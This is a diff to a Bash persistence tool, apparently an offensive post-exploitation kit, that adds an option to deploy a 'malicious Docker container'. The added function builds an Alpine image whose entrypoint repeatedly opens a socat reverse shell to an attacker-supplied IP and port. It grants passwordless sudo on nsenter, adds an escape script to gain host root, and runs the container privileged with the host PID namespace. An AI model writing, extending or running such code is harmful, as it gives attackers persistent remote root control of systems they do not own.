@@ -240,6 +240,11 @@ usage_root() {
 	echo "          --path <path>              Specify custom path"
 	echo "          --hook                     Establish Persistence through a Git Hook"
 	echo "          --pager                    Establish Persistence through Git Pager"
+    echo "  --malicious-docker-container   Set up a malicious Docker container"
+	echo "      --default                    Use default bind shell settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+    echo ""
 }
 
 setup_systemd() {
@@ -2392,6 +2397,82 @@ setup_git_persistence() {
     fi
 }
 
+setup_malicious_docker_container() {
+    local default=0
+    local ip=""
+    local port=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            * )
+                echo "Invalid option for --generator-persistence: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $ip || -z $port ]]; then
+        echo "Error: --ip and --port must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    if ! docker ps &> /dev/null; then
+        echo "Error: Docker daemon is not running or permission denied."
+        exit 1
+    fi
+
+    # Dockerfile setup and Docker image creation
+    DOCKERFILE="/tmp/Dockerfile"
+    cat <<-EOF > $DOCKERFILE
+    FROM alpine:latest
+
+    RUN apk add --no-cache bash socat sudo util-linux procps
+
+    RUN adduser -D lowprivuser
+
+    RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
+        && echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
+        && chmod +x /usr/local/bin/entrypoint.sh
+
+    RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
+        && echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
+        && chmod +x /usr/local/bin/escape.sh \\
+        && echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers
+
+    USER lowprivuser
+
+    ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
+	EOF
+
+    # Building and running the Docker container
+    docker build -t malicious-container -f $DOCKERFILE . && \
+    docker run -d --name malicious-container --privileged --pid=host malicious-container
+
+    echo "[+] Persistence through malicious Docker container complete."
+	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
+}
+
 main() {
 	local QUIET=0
 
@@ -2550,6 +2631,11 @@ main() {
 				setup_git_persistence "$@"
 				exit
 				;;
+            --malicious-docker-container )
+                shift
+                setup_malicious_docker_container "$@"
+                exit
+                ;;
 			* )
 				echo "Invalid option: $1"
 				if check_root; then
